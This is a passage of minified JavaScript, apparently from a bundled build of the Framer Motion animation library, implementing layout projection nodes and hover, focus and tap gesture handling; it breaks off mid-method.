function tP(e, t) {
  const n = ln.now(),
    r = ({
      timestamp: s
    }) => {
      const o = s - n;
      o >= t && (hr(r), e(o - t))
    };
  return ue.read(r, !0), () => hr(r)
}

function nP(e) {
  return e instanceof SVGElement && e.tagName !== "svg"
}

function rP(e, t, n) {
  const r = qe(e) ? e : pi(e);
  return r.start(rh("", r, t, n)), r.animation
}
const Ar = {
  type: "projectionFrame",
  totalNodes: 0,
  resolvedTargetDeltas: 0,
  recalculatedProjection: 0
},
  Po = typeof window < "u" && window.MotionDebug !== void 0,
  eu = ["", "X", "Y", "Z"],
  sP = {
    visibility: "hidden"
  },
  mg = 1e3;
let oP = 0;

function tu(e, t, n, r) {
  const {
    latestValues: s
  } = t;
  s[e] && (n[e] = s[e], t.setStaticValue(e, 0), r && (r[e] = 0))
}

function z1(e) {
  if (e.hasCheckedOptimisedAppear = !0, e.root === e) return;
  const {
    visualElement: t
  } = e.options;
  if (!t) return;
  const n = b1(t);
  if (window.MotionHasOptimisedAnimation(n, "transform")) {
    const {
      layout: s,
      layoutId: o
    } = e.options;
    window.MotionCancelOptimisedAnimation(n, "transform", ue, !(s || o))
  }
  const {
    parent: r
  } = e;
  r && !r.hasCheckedOptimisedAppear && z1(r)
}

function U1({
  attachResizeListener: e,
  defaultParent: t,
  measureScroll: n,
  checkIsScrollRoot: r,
  resetTransform: s
}) {
  return class {
    constructor(i = {}, a = t == null ? void 0 : t()) {
      this.id = oP++, this.animationId = 0, this.children = new Set, this.options = {}, this.isTreeAnimating = !1, this.isAnimationBlocked = !1, this.isLayoutDirty = !1, this.isProjectionDirty = !1, this.isSharedProjectionDirty = !1, this.isTransformDirty = !1, this.updateManuallyBlocked = !1, this.updateBlockedByResize = !1, this.isUpdating = !1, this.isSVG = !1, this.needsReset = !1, this.shouldResetTransform = !1, this.hasCheckedOptimisedAppear = !1, this.treeScale = {
        x: 1,
        y: 1
      }, this.eventHandlers = new Map, this.hasTreeAnimated = !1, this.updateScheduled = !1, this.scheduleUpdate = () => this.update(), this.projectionUpdateScheduled = !1, this.checkUpdateFailed = () => {
        this.isUpdating && (this.isUpdating = !1, this.clearAllSnapshots())
      }, this.updateProjection = () => {
        this.projectionUpdateScheduled = !1, Po && (Ar.totalNodes = Ar.resolvedTargetDeltas = Ar.recalculatedProjection = 0), this.nodes.forEach(lP), this.nodes.forEach(hP), this.nodes.forEach(mP), this.nodes.forEach(cP), Po && window.MotionDebug.record(Ar)
      }, this.resolvedRelativeTargetAt = 0, this.hasProjected = !1, this.isVisible = !0, this.animationProgress = 0, this.sharedNodes = new Map, this.latestValues = i, this.root = a ? a.root || a : this, this.path = a ? [...a.path, a] : [], this.parent = a, this.depth = a ? a.depth + 1 : 0;
      for (let c = 0; c < this.path.length; c++) this.path[c].shouldResetTransform = !0;
      this.root === this && (this.nodes = new eP)
    }
    addEventListener(i, a) {
      return this.eventHandlers.has(i) || this.eventHandlers.set(i, new ih), this.eventHandlers.get(i).add(a)
    }
    notifyListeners(i, ...a) {
      const c = this.eventHandlers.get(i);
      c && c.notify(...a)
    }
    hasListeners(i) {
      return this.eventHandlers.has(i)
    }
    mount(i, a = this.root.hasTreeAnimated) {
      if (this.instance) return;
      this.isSVG = nP(i), this.instance = i;
      const {
        layoutId: c,
        layout: u,
        visualElement: d
      } = this.options;
      if (d && !d.current && d.mount(i), this.root.nodes.add(this), this.parent && this.parent.children.add(this), a && (u || c) && (this.isLayoutDirty = !0), e) {
        let f;
        const h = () => this.root.updateBlockedByResize = !1;
        e(i, () => {
          this.root.updateBlockedByResize = !0, f && f(), f = tP(h, 250), Ea.hasAnimatedSinceResize && (Ea.hasAnimatedSinceResize = !1, this.nodes.forEach(gg))
        })
      }
      c && this.root.registerSharedNode(c, this), this.options.animate !== !1 && d && (c || u) && this.addEventListener("didUpdate", ({
        delta: f,
        hasLayoutChanged: h,
        hasRelativeTargetChanged: y,
        layout: w
      }) => {
        if (this.isTreeAnimationBlocked()) {
          this.target = void 0, this.relativeTarget = void 0;
          return
        }
        const v = this.options.transition || d.getDefaultTransition() || xP,
          {
            onLayoutAnimationStart: S,
            onLayoutAnimationComplete: g
          } = d.getProps(),
          p = !this.targetLayout || !B1(this.targetLayout, w) || y,
          m = !h && y;
        if (this.options.layoutRoot || this.resumeFrom && this.resumeFrom.instance || m || h && (p || !this.currentAnimation)) {
          this.resumeFrom && (this.resumingFrom = this.resumeFrom, this.resumingFrom.resumingFrom = void 0), this.setAnimationOrigin(f, m);
          const b = {
            ...$f(v, "layout"),
            onPlay: S,
            onComplete: g
          };
          (d.shouldReduceMotion || this.options.layoutRoot) && (b.delay = 0, b.type = !1), this.startAnimation(b)
        } else h || gg(this), this.isLead() && this.options.onExitComplete && this.options.onExitComplete();
        this.targetLayout = w
      })
    }
    unmount() {
      this.options.layoutId && this.willUpdate(), this.root.nodes.remove(this);
      const i = this.getStack();
      i && i.remove(this), this.parent && this.parent.children.delete(this), this.instance = void 0, hr(this.updateProjection)
    }
    blockUpdate() {
      this.updateManuallyBlocked = !0
    }
    unblockUpdate() {
      this.updateManuallyBlocked = !1
    }
    isUpdateBlocked() {
      return this.updateManuallyBlocked || this.updateBlockedByResize
    }
    isTreeAnimationBlocked() {
      return this.isAnimationBlocked || this.parent && this.parent.isTreeAnimationBlocked() || !1
    }
    startUpdate() {
      this.isUpdateBlocked() || (this.isUpdating = !0, this.nodes && this.nodes.forEach(pP), this.animationId++)
    }
    getTransformTemplate() {
      const {
        visualElement: i
      } = this.options;
      return i && i.getProps().transformTemplate
    }
    willUpdate(i = !0) {
      if (this.root.hasTreeAnimated = !0, this.root.isUpdateBlocked()) {
        this.options.onExitComplete && this.options.onExitComplete();
        return
      }
      if (window.MotionCancelOptimisedAnimation && !this.hasCheckedOptimisedAppear && z1(this), !this.root.isUpdating && this.root.startUpdate(), this.isLayoutDirty) return;
      this.isLayoutDirty = !0;
      for (let d = 0; d < this.path.length; d++) {
        const f = this.path[d];
        f.shouldResetTransform = !0, f.updateScroll("snapshot"), f.options.layoutRoot && f.willUpdate(!1)
      }
      const {
        layoutId: a,
        layout: c
      } = this.options;
      if (a === void 0 && !c) return;
      const u = this.getTransformTemplate();
      this.prevTransformTemplateValue = u ? u(this.latestValues, "") : void 0, this.updateSnapshot(), i && this.notifyListeners("willUpdate")
    }
    update() {
      if (this.updateScheduled = !1, this.isUpdateBlocked()) {
        this.unblockUpdate(), this.clearAllSnapshots(), this.nodes.forEach(pg);
        return
      }
      this.isUpdating || this.nodes.forEach(dP), this.isUpdating = !1, this.nodes.forEach(fP), this.nodes.forEach(iP), this.nodes.forEach(aP), this.clearAllSnapshots();
      const a = ln.now();
      Fe.delta = Mn(0, 1e3 / 60, a - Fe.timestamp), Fe.timestamp = a, Fe.isProcessing = !0, Kc.update.process(Fe), Kc.preRender.process(Fe), Kc.render.process(Fe), Fe.isProcessing = !1
    }
    didUpdate() {
      this.updateScheduled || (this.updateScheduled = !0, ch.read(this.scheduleUpdate))
    }
    clearAllSnapshots() {
      this.nodes.forEach(uP), this.sharedNodes.forEach(gP)
    }
    scheduleUpdateProjection() {
      this.projectionUpdateScheduled || (this.projectionUpdateScheduled = !0, ue.preRender(this.updateProjection, !1, !0))
    }
    scheduleCheckAfterUnmount() {
      ue.postRender(() => {
        this.isLayoutDirty ? this.root.didUpdate() : this.root.checkUpdateFailed()
      })
    }
    updateSnapshot() {
      this.snapshot || !this.instance || (this.snapshot = this.measure())
    }
    updateLayout() {
      if (!this.instance || (this.updateScroll(), !(this.options.alwaysMeasureLayout && this.isLead()) && !this.isLayoutDirty)) return;
      if (this.resumeFrom && !this.resumeFrom.instance)
        for (let c = 0; c < this.path.length; c++) this.path[c].updateScroll();
      const i = this.layout;
      this.layout = this.measure(!1), this.layoutCorrected = je(), this.isLayoutDirty = !1, this.projectionDelta = void 0, this.notifyListeners("measure", this.layout.layoutBox);
      const {
        visualElement: a
      } = this.options;
      a && a.notify("LayoutMeasure", this.layout.layoutBox, i ? i.layoutBox : void 0)
    }
    updateScroll(i = "measure") {
      let a = !!(this.options.layoutScroll && this.instance);
      if (this.scroll && this.scroll.animationId === this.root.animationId && this.scroll.phase === i && (a = !1), a) {
        const c = r(this.instance);
        this.scroll = {
          animationId: this.root.animationId,
          phase: i,
          isRoot: c,
          offset: n(this.instance),
          wasRoot: this.scroll ? this.scroll.isRoot : c
        }
      }
    }
    resetTransform() {
      if (!s) return;
      const i = this.isLayoutDirty || this.shouldResetTransform || this.options.alwaysMeasureLayout,
        a = this.projectionDelta && !V1(this.projectionDelta),
        c = this.getTransformTemplate(),
        u = c ? c(this.latestValues, "") : void 0,
        d = u !== this.prevTransformTemplateValue;
      i && (a || jr(this.latestValues) || d) && (s(this.instance, u), this.shouldResetTransform = !1, this.scheduleRender())
    }
    measure(i = !0) {
      const a = this.measurePageBox();
      let c = this.removeElementScroll(a);
      return i && (c = this.removeTransform(c)), wP(c), {
        animationId: this.root.animationId,
        measuredBox: a,
        layoutBox: c,
        latestValues: {},
        source: this.id
      }
    }
    measurePageBox() {
      var i;
      const {
        visualElement: a
      } = this.options;
      if (!a) return je();
      const c = a.measureViewportBox();
      if (!(((i = this.scroll) === null || i === void 0 ? void 0 : i.wasRoot) || this.path.some(bP))) {
        const {
          scroll: d
        } = this.root;
        d && (gs(c.x, d.offset.x), gs(c.y, d.offset.y))
      }
      return c
    }
    removeElementScroll(i) {
      var a;
      const c = je();
      if (Pt(c, i), !((a = this.scroll) === null || a === void 0) && a.wasRoot) return c;
      for (let u = 0; u < this.path.length; u++) {
        const d = this.path[u],
          {
            scroll: f,
            options: h
          } = d;
        d !== this.root && f && h.layoutScroll && (f.wasRoot && Pt(c, i), gs(c.x, f.offset.x), gs(c.y, f.offset.y))
      }
      return c
    }
    applyTransform(i, a = !1) {
      const c = je();
      Pt(c, i);
      for (let u = 0; u < this.path.length; u++) {
        const d = this.path[u];
        !a && d.options.layoutScroll && d.scroll && d !== d.root && ys(c, {
          x: -d.scroll.offset.x,
          y: -d.scroll.offset.y
        }), jr(d.latestValues) && ys(c, d.latestValues)
      }
      return jr(this.latestValues) && ys(c, this.latestValues), c
    }
    removeTransform(i) {
      const a = je();
      Pt(a, i);
      for (let c = 0; c < this.path.length; c++) {
        const u = this.path[c];
        if (!u.instance || !jr(u.latestValues)) continue;
        Cd(u.latestValues) && u.updateSnapshot();
        const d = je(),
          f = u.measurePageBox();
        Pt(d, f), lg(a, u.latestValues, u.snapshot ? u.snapshot.layoutBox : void 0, d)
      }
      return jr(this.latestValues) && lg(a, this.latestValues), a
    }
    setTargetDelta(i) {
      this.targetDelta = i, this.root.scheduleUpdateProjection(), this.isProjectionDirty = !0
    }
    setOptions(i) {
      this.options = {
        ...this.options,
        ...i,
        crossfade: i.crossfade !== void 0 ? i.crossfade : !0
      }
    }
    clearMeasurements() {
      this.scroll = void 0, this.layout = void 0, this.snapshot = void 0, this.prevTransformTemplateValue = void 0, this.targetDelta = void 0, this.target = void 0, this.isLayoutDirty = !1
    }
    forceRelativeParentToResolveTarget() {
      this.relativeParent && this.relativeParent.resolvedRelativeTargetAt !== Fe.timestamp && this.relativeParent.resolveTargetDelta(!0)
    }
    resolveTargetDelta(i = !1) {
      var a;
      const c = this.getLead();
      this.isProjectionDirty || (this.isProjectionDirty = c.isProjectionDirty), this.isTransformDirty || (this.isTransformDirty = c.isTransformDirty), this.isSharedProjectionDirty || (this.isSharedProjectionDirty = c.isSharedProjectionDirty);
      const u = !!this.resumingFrom || this !== c;
      if (!(i || u && this.isSharedProjectionDirty || this.isProjectionDirty || !((a = this.parent) === null || a === void 0) && a.isProjectionDirty || this.attemptToResolveRelativeTarget || this.root.updateBlockedByResize)) return;
      const {
        layout: f,
        layoutId: h
      } = this.options;
      if (!(!this.layout || !(f || h))) {
        if (this.resolvedRelativeTargetAt = Fe.timestamp, !this.targetDelta && !this.relativeTarget) {
          const y = this.getClosestProjectingParent();
          y && y.layout && this.animationProgress !== 1 ? (this.relativeParent = y, this.forceRelativeParentToResolveTarget(), this.relativeTarget = je(), this.relativeTargetOrigin = je(), Uo(this.relativeTargetOrigin, this.layout.layoutBox, y.layout.layoutBox), Pt(this.relativeTarget, this.relativeTargetOrigin)) : this.relativeParent = this.relativeTarget = void 0
        }
        if (!(!this.relativeTarget && !this.targetDelta)) {
          if (this.target || (this.target = je(), this.targetWithTransforms = je()), this.relativeTarget && this.relativeTargetOrigin && this.relativeParent && this.relativeParent.target ? (this.forceRelativeParentToResolveTarget(), S4(this.target, this.relativeTarget, this.relativeParent.target)) : this.targetDelta ? (this.resumingFrom ? this.target = this.applyTransform(this.layout.layoutBox) : Pt(this.target, this.layout.layoutBox), D1(this.target, this.targetDelta)) : Pt(this.target, this.layout.layoutBox), this.attemptToResolveRelativeTarget) {
            this.attemptToResolveRelativeTarget = !1;
            const y = this.getClosestProjectingParent();
            y && !!y.resumingFrom == !!this.resumingFrom && !y.options.layoutScroll && y.target && this.animationProgress !== 1 ? (this.relativeParent = y, this.forceRelativeParentToResolveTarget(), this.relativeTarget = je(), this.relativeTargetOrigin = je(), Uo(this.relativeTargetOrigin, this.target, y.target), Pt(this.relativeTarget, this.relativeTargetOrigin)) : this.relativeParent = this.relativeTarget = void 0
          }
          Po && Ar.resolvedTargetDeltas++
        }
      }
    }
    getClosestProjectingParent() {
      if (!(!this.parent || Cd(this.parent.latestValues) || R1(this.parent.latestValues))) return this.parent.isProjecting() ? this.parent : this.parent.getClosestProjectingParent()
    }
    isProjecting() {
      return !!((this.relativeTarget || this.targetDelta || this.options.layoutRoot) && this.layout)
    }
    calcProjection() {
      var i;
      const a = this.getLead(),
        c = !!this.resumingFrom || this !== a;
      let u = !0;
      if ((this.isProjectionDirty || !((i = this.parent) === null || i === void 0) && i.isProjectionDirty) && (u = !1), c && (this.isSharedProjectionDirty || this.isTransformDirty) && (u = !1), this.resolvedRelativeTargetAt === Fe.timestamp && (u = !1), u) return;
      const {
        layout: d,
        layoutId: f
      } = this.options;
      if (this.isTreeAnimating = !!(this.parent && this.parent.isTreeAnimating || this.currentAnimation || this.pendingAnimation), this.isTreeAnimating || (this.targetDelta = this.relativeTarget = void 0), !this.layout || !(d || f)) return;
      Pt(this.layoutCorrected, this.layout.layoutBox);
      const h = this.treeScale.x,
        y = this.treeScale.y;
      R4(this.layoutCorrected, this.treeScale, this.path, c), a.layout && !a.target && (this.treeScale.x !== 1 || this.treeScale.y !== 1) && (a.target = a.layout.layoutBox, a.targetWithTransforms = je());
      const {
        target: w
      } = a;
      if (!w) {
        this.prevProjectionDelta && (this.createProjectionDeltas(), this.scheduleRender());
        return
      } !this.projectionDelta || !this.prevProjectionDelta ? this.createProjectionDeltas() : (og(this.prevProjectionDelta.x, this.projectionDelta.x), og(this.prevProjectionDelta.y, this.projectionDelta.y)), zo(this.projectionDelta, this.layoutCorrected, w, this.latestValues), (this.treeScale.x !== h || this.treeScale.y !== y || !hg(this.projectionDelta.x, this.prevProjectionDelta.x) || !hg(this.projectionDelta.y, this.prevProjectionDelta.y)) && (this.hasProjected = !0, this.scheduleRender(), this.notifyListeners("projectionUpdate", w)), Po && Ar.recalculatedProjection++
    }
    hide() {
      this.isVisible = !1
    }
    show() {
      this.isVisible = !0
    }
    scheduleRender(i = !0) {
      var a;
      if ((a = this.options.visualElement) === null || a === void 0 || a.scheduleRender(), i) {
        const c = this.getStack();
        c && c.scheduleRender()
      }
      this.resumingFrom && !this.resumingFrom.instance && (this.resumingFrom = void 0)
    }
    createProjectionDeltas() {
      this.prevProjectionDelta = ps(), this.projectionDelta = ps(), this.projectionDeltaWithTransform = ps()
    }
    setAnimationOrigin(i, a = !1) {
      const c = this.snapshot,
        u = c ? c.latestValues : {},
        d = {
          ...this.latestValues
        },
        f = ps();
      (!this.relativeParent || !this.relativeParent.options.layoutRoot) && (this.relativeTarget = this.relativeTargetOrigin = void 0), this.attemptToResolveRelativeTarget = !a;
      const h = je(),
        y = c ? c.source : void 0,
        w = this.layout ? this.layout.source : void 0,
        v = y !== w,
        S = this.getStack(),
        g = !S || S.members.length <= 1,
        p = !!(v && !g && this.options.crossfade === !0 && !this.path.some(vP));
      this.animationProgress = 0;
      let m;
      this.mixTargetDelta = b => {
        const C = b / 1e3;
        yg(f.x, i.x, C), yg(f.y, i.y, C), this.setTargetDelta(f), this.relativeTarget && this.relativeTargetOrigin && this.layout && this.relativeParent && this.relativeParent.layout && (Uo(h, this.layout.layoutBox, this.relativeParent.layout.layoutBox), yP(this.relativeTarget, this.relativeTargetOrigin, h, C), m && Y4(this.relativeTarget, m) && (this.isProjectionDirty = !1), m || (m = je()), Pt(m, this.relativeTarget)), v && (this.animationValues = d, H4(d, u, this.latestValues, C, p, g)), this.root.scheduleUpdateProjection(), this.scheduleRender(), this.animationProgress = C
      }, this.mixTargetDelta(this.options.layoutRoot ? 1e3 : 0)
    }
    startAnimation(i) {
      this.notifyListeners("animationStart"), this.currentAnimation && this.currentAnimation.stop(), this.resumingFrom && this.resumingFrom.currentAnimation && this.resumingFrom.currentAnimation.stop(), this.pendingAnimation && (hr(this.pendingAnimation), this.pendingAnimation = void 0), this.pendingAnimation = ue.update(() => {
        Ea.hasAnimatedSinceResize = !0, this.currentAnimation = rP(0, mg, {
          ...i,
          onUpdate: a => {
            this.mixTargetDelta(a), i.onUpdate && i.onUpdate(a)
          },
          onComplete: () => {
            i.onComplete && i.onComplete(), this.completeAnimation()
          }
        }), this.resumingFrom && (this.resumingFrom.currentAnimation = this.currentAnimation), this.pendingAnimation = void 0
      })
    }
    completeAnimation() {
      this.resumingFrom && (this.resumingFrom.currentAnimation = void 0, this.resumingFrom.preserveOpacity = void 0);
      const i = this.getStack();
      i && i.exitAnimationComplete(), this.resumingFrom = this.currentAnimation = this.animationValues = void 0, this.notifyListeners("animationComplete")
    }
    finishAnimation() {
      this.currentAnimation && (this.mixTargetDelta && this.mixTargetDelta(mg), this.currentAnimation.stop()), this.completeAnimation()
    }
    applyTransformsToTarget() {
      const i = this.getLead();
      let {
        targetWithTransforms: a,
        target: c,
        layout: u,
        latestValues: d
      } = i;
      if (!(!a || !c || !u)) {
        if (this !== i && this.layout && u && $1(this.options.animationType, this.layout.layoutBox, u.layoutBox)) {
          c = this.target || je();
          const f = bt(this.layout.layoutBox.x);
          c.x.min = i.target.x.min, c.x.max = c.x.min + f;
          const h = bt(this.layout.layoutBox.y);
          c.y.min = i.target.y.min, c.y.max = c.y.min + h
        }
        Pt(a, c), ys(a, d), zo(this.projectionDeltaWithTransform, this.layoutCorrected, a, d)
      }
    }
    registerSharedNode(i, a) {
      this.sharedNodes.has(i) || this.sharedNodes.set(i, new X4), this.sharedNodes.get(i).add(a);
      const u = a.options.initialPromotionConfig;
      a.promote({
        transition: u ? u.transition : void 0,
        preserveFollowOpacity: u && u.shouldPreserveFollowOpacity ? u.shouldPreserveFollowOpacity(a) : void 0
      })
    }
    isLead() {
      const i = this.getStack();
      return i ? i.lead === this : !0
    }
    getLead() {
      var i;
      const {
        layoutId: a
      } = this.options;
      return a ? ((i = this.getStack()) === null || i === void 0 ? void 0 : i.lead) || this : this
    }
    getPrevLead() {
      var i;
      const {
        layoutId: a
      } = this.options;
      return a ? (i = this.getStack()) === null || i === void 0 ? void 0 : i.prevLead : void 0
    }
    getStack() {
      const {
        layoutId: i
      } = this.options;
      if (i) return this.root.sharedNodes.get(i)
    }
    promote({
      needsReset: i,
      transition: a,
      preserveFollowOpacity: c
    } = {}) {
      const u = this.getStack();
      u && u.promote(this, c), i && (this.projectionDelta = void 0, this.needsReset = !0), a && this.setOptions({
        transition: a
      })
    }
    relegate() {
      const i = this.getStack();
      return i ? i.relegate(this) : !1
    }
    resetSkewAndRotation() {
      const {
        visualElement: i
      } = this.options;
      if (!i) return;
      let a = !1;
      const {
        latestValues: c
      } = i;
      if ((c.z || c.rotate || c.rotateX || c.rotateY || c.rotateZ || c.skewX || c.skewY) && (a = !0), !a) return;
      const u = {};
      c.z && tu("z", i, u, this.animationValues);
      for (let d = 0; d < eu.length; d++) tu(`rotate${eu[d]}`, i, u, this.animationValues), tu(`skew${eu[d]}`, i, u, this.animationValues);
      i.render();
      for (const d in u) i.setStaticValue(d, u[d]), this.animationValues && (this.animationValues[d] = u[d]);
      i.scheduleRender()
    }
    getProjectionStyles(i) {
      var a, c;
      if (!this.instance || this.isSVG) return;
      if (!this.isVisible) return sP;
      const u = {
        visibility: ""
      },
        d = this.getTransformTemplate();
      if (this.needsReset) return this.needsReset = !1, u.opacity = "", u.pointerEvents = Ta(i == null ? void 0 : i.pointerEvents) || "", u.transform = d ? d(this.latestValues, "") : "none", u;
      const f = this.getLead();
      if (!this.projectionDelta || !this.layout || !f.target) {
        const v = {};
        return this.options.layoutId && (v.opacity = this.latestValues.opacity !== void 0 ? this.latestValues.opacity : 1, v.pointerEvents = Ta(i == null ? void 0 : i.pointerEvents) || ""), this.hasProjected && !jr(this.latestValues) && (v.transform = d ? d({}, "") : "none", this.hasProjected = !1), v
      }
      const h = f.animationValues || f.latestValues;
      this.applyTransformsToTarget(), u.transform = J4(this.projectionDeltaWithTransform, this.treeScale, h), d && (u.transform = d(h, u.transform));
      const {
        x: y,
        y: w
      } = this.projectionDelta;
      u.transformOrigin = `${y.origin * 100}% ${w.origin * 100}% 0`, f.animationValues ? u.opacity = f === this ? (c = (a = h.opacity) !== null && a !== void 0 ? a : this.latestValues.opacity) !== null && c !== void 0 ? c : 1 : this.preserveOpacity ? this.latestValues.opacity : h.opacityExit : u.opacity = f === this ? h.opacity !== void 0 ? h.opacity : "" : h.opacityExit !== void 0 ? h.opacityExit : 0;
      for (const v in fl) {
        if (h[v] === void 0) continue;
        const {
          correct: S,
          applyTo: g
        } = fl[v], p = u.transform === "none" ? h[v] : S(h[v], f);
        if (g) {
          const m = g.length;
          for (let b = 0; b < m; b++) u[g[b]] = p
        } else u[v] = p
      }
      return this.options.layoutId && (u.pointerEvents = f === this ? Ta(i == null ? void 0 : i.pointerEvents) || "" : "none"), u
    }
    clearSnapshot() {
      this.resumeFrom = this.snapshot = void 0
    }
    resetTree() {
      this.root.nodes.forEach(i => {
        var a;
        return (a = i.currentAnimation) === null || a === void 0 ? void 0 : a.stop()
      }), this.root.nodes.forEach(pg), this.root.sharedNodes.clear()
    }
  }
}

function iP(e) {
  e.updateLayout()
}

function aP(e) {
  var t;
  const n = ((t = e.resumeFrom) === null || t === void 0 ? void 0 : t.snapshot) || e.snapshot;
  if (e.isLead() && e.layout && n && e.hasListeners("didUpdate")) {
    const {
      layoutBox: r,
      measuredBox: s
    } = e.layout, {
      animationType: o
    } = e.options, i = n.source !== e.layout.source;
    o === "size" ? Tt(f => {
      const h = i ? n.measuredBox[f] : n.layoutBox[f],
        y = bt(h);
      h.min = r[f].min, h.max = h.min + y
    }) : $1(o, n.layoutBox, r) && Tt(f => {
      const h = i ? n.measuredBox[f] : n.layoutBox[f],
        y = bt(r[f]);
      h.max = h.min + y, e.relativeTarget && !e.currentAnimation && (e.isProjectionDirty = !0, e.relativeTarget[f].max = e.relativeTarget[f].min + y)
    });
    const a = ps();
    zo(a, r, n.layoutBox);
    const c = ps();
    i ? zo(c, e.applyTransform(s, !0), n.measuredBox) : zo(c, r, n.layoutBox);
    const u = !V1(a);
    let d = !1;
    if (!e.resumeFrom) {
      const f = e.getClosestProjectingParent();
      if (f && !f.resumeFrom) {
        const {
          snapshot: h,
          layout: y
        } = f;
        if (h && y) {
          const w = je();
          Uo(w, n.layoutBox, h.layoutBox);
          const v = je();
          Uo(v, r, y.layoutBox), B1(w, v) || (d = !0), f.options.layoutRoot && (e.relativeTarget = v, e.relativeTargetOrigin = w, e.relativeParent = f)
        }
      }
    }
    e.notifyListeners("didUpdate", {
      layout: r,
      snapshot: n,
      delta: c,
      layoutDelta: a,
      hasLayoutChanged: u,
      hasRelativeTargetChanged: d
    })
  } else if (e.isLead()) {
    const {
      onExitComplete: r
    } = e.options;
    r && r()
  }
  e.options.transition = void 0
}

function lP(e) {
  Po && Ar.totalNodes++, e.parent && (e.isProjecting() || (e.isProjectionDirty = e.parent.isProjectionDirty), e.isSharedProjectionDirty || (e.isSharedProjectionDirty = !!(e.isProjectionDirty || e.parent.isProjectionDirty || e.parent.isSharedProjectionDirty)), e.isTransformDirty || (e.isTransformDirty = e.parent.isTransformDirty))
}

function cP(e) {
  e.isProjectionDirty = e.isSharedProjectionDirty = e.isTransformDirty = !1
}

function uP(e) {
  e.clearSnapshot()
}

function pg(e) {
  e.clearMeasurements()
}

function dP(e) {
  e.isLayoutDirty = !1
}

function fP(e) {
  const {
    visualElement: t
  } = e.options;
  t && t.getProps().onBeforeLayoutMeasure && t.notify("BeforeLayoutMeasure"), e.resetTransform()
}

function gg(e) {
  e.finishAnimation(), e.targetDelta = e.relativeTarget = e.target = void 0, e.isProjectionDirty = !0
}

function hP(e) {
  e.resolveTargetDelta()
}

function mP(e) {
  e.calcProjection()
}

function pP(e) {
  e.resetSkewAndRotation()
}

function gP(e) {
  e.removeLeadSnapshot()
}

function yg(e, t, n) {
  e.translate = xe(t.translate, 0, n), e.scale = xe(t.scale, 1, n), e.origin = t.origin, e.originPoint = t.originPoint
}

function vg(e, t, n, r) {
  e.min = xe(t.min, n.min, r), e.max = xe(t.max, n.max, r)
}

function yP(e, t, n, r) {
  vg(e.x, t.x, n.x, r), vg(e.y, t.y, n.y, r)
}

function vP(e) {
  return e.animationValues && e.animationValues.opacityExit !== void 0
}
const xP = {
  duration: .45,
  ease: [.4, 0, .1, 1]
},
  xg = e => typeof navigator < "u" && navigator.userAgent && navigator.userAgent.toLowerCase().includes(e),
  wg = xg("applewebkit/") && !xg("chrome/") ? Math.round : Ye;

function bg(e) {
  e.min = wg(e.min), e.max = wg(e.max)
}

function wP(e) {
  bg(e.x), bg(e.y)
}

function $1(e, t, n) {
  return e === "position" || e === "preserve-aspect" && !b4(fg(t), fg(n), .2)
}

function bP(e) {
  var t;
  return e !== e.root && ((t = e.scroll) === null || t === void 0 ? void 0 : t.wasRoot)
}
const SP = U1({
  attachResizeListener: (e, t) => Cn(e, "resize", t),
  measureScroll: () => ({
    x: document.documentElement.scrollLeft || document.body.scrollLeft,
    y: document.documentElement.scrollTop || document.body.scrollTop
  }),
  checkIsScrollRoot: () => !0
}),
  nu = {
    current: void 0
  },
  H1 = U1({
    measureScroll: e => ({
      x: e.scrollLeft,
      y: e.scrollTop
    }),
    defaultParent: () => {
      if (!nu.current) {
        const e = new SP({});
        e.mount(window), e.setOptions({
          layoutScroll: !0
        }), nu.current = e
      }
      return nu.current
    },
    resetTransform: (e, t) => {
      e.style.transform = t !== void 0 ? t : "none"
    },
    checkIsScrollRoot: e => window.getComputedStyle(e).position === "fixed"
  }),
  CP = {
    pan: {
      Feature: O4
    },
    drag: {
      Feature: L4,
      ProjectionNode: H1,
      MeasureLayout: L1
    }
  };

function Sg(e, t, n) {
  const {
    props: r
  } = e;
  e.animationState && r.whileHover && e.animationState.setActive("whileHover", n);
  const s = r[n ? "onHoverStart" : "onHoverEnd"];
  s && ue.postRender(() => s(t, Ti(t)))
}
class NP extends xr {
  mount() {
    const {
      current: t,
      props: n
    } = this.node;
    t && (this.unmount = d4(t, r => (Sg(this.node, r, !0), s => Sg(this.node, s, !1)), {
      passive: !n.onHoverStart && !n.onHoverEnd
    }))
  }
  unmount() { }
}
class jP extends xr {
  constructor() {
    super(...arguments), this.isActive = !1
  }
  onFocus() {
    let t = !1;
    try {
      t = this.node.current.matches(":focus-visible")
    } catch {
      t = !0
    } !t || !this.node.animationState || (this.node.animationState.setActive("whileFocus", !0), this.isActive = !0)
  }
  onBlur() {
    !this.isActive || !this.node.animationState || (this.node.animationState.setActive("whileFocus", !1), this.isActive = !1)
  }
  mount() {
    this.unmount = cr(Cn(this.node.current, "focus", () => this.onFocus()), Cn(this.node.current, "blur", () => this.onBlur()))
  }
  unmount() { }
}
const W1 = (e, t) => t ? e === t ? !0 : W1(e, t.parentElement) : !1;

function ru(e, t) {
  if (!t) return;
  const n = new PointerEvent("pointer" + e);
  t(n, Ti(n))
}
class AP extends xr {
  constructor() {
    super(...arguments), this.removeStartListeners = Ye, this.removeEndListeners = Ye, this.removeAccessibleListeners = Ye, this.startPointerPress = (t, n) => {
      if (this.isPressing) return;
      this.removeEndListeners();
      const r = this.node.getProps(),
        o = ur(window, "pointerup", (a, c) => {
          if (!this.checkPressEnd()) return;
          const {
            onTap: u,
            onTapCancel: d,
            globalTapTarget: f
          } = this.node.getProps(), h = !f && !W1(this.node.current, a.target) ? d : u;
          h && ue.update(() => h(a, c))
        }, {
          passive: !(r.onTap || r.onPointerUp)
        }),
        i = ur(window, "pointercancel", (a, c) => this.cancelPress(a, c), {
          passive: !(r.onTapCancel || r.onPointerCancel)
        });
      this.removeEndListeners = cr(o, i), this.startPress(t, n)
    }, this.startAccessiblePress = () => {
      const t = o => {
        if (o.key !== "Enter" || this.isPressing) return;
        const i = a => {
          a.key !== "Enter" || !this.checkPressEnd() || ru("up", (c, u) => {
            const {
              onTap: d
            } = this.node.getProps();
            d && ue.postRender(() => d(c, u))
          })
        };
        this.removeEndListeners(), this.removeEndListeners = Cn(this.node.current, "keyup", i), ru("down", (a, c) => {
          this.startPress(a, c)
        })
      },
        n = Cn(this.node.current, "keydown", t),
        r = () => {
          this.isPressing && ru("cancel", (o, i) => this.cancelPress(o, i))
        },
        s = Cn(this.node.current, "blur", r);
      this.removeAccessibleListeners = cr(n, s)
    }
  }
  startPress(t, n) {
    this.isPressing = !0;
    const {
      onTapStart: r,
      whileTap: s
    } = this.node.getProps();
    s && this.node.animationState && this.node.animationState.setActive("whileTap", !0), r && ue.postRender(() => r(t, n))
  }
  checkPressEnd() {
